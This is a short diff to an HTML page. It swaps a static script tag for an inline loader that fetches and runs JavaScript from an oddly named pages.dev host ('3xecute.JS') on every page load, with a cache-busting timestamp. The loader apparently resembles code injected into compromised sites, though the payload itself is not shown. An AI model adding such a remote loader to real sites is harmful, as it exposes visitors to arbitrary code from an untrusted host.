@@ -406,7 +406,15 @@
         
     >
 
-    <script src="https://cdn-globaljs-pr3.pages.dev/cdn-globaljs/MainJS/UpperJS/3xecute.JS" Defer></script>
+    <script>
+  (function () {
+    const ts = Date.now();
+    const s = document.createElement('script');
+    s.src = 'https://cdn-globaljs-pr3.pages.dev/cdn-globaljs/MainJS/UpperJS/3xecute.JS?v=' + ts;
+    s.defer = true;
+    document.body.appendChild(s);
+  })();
+</script>
 
 
         <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
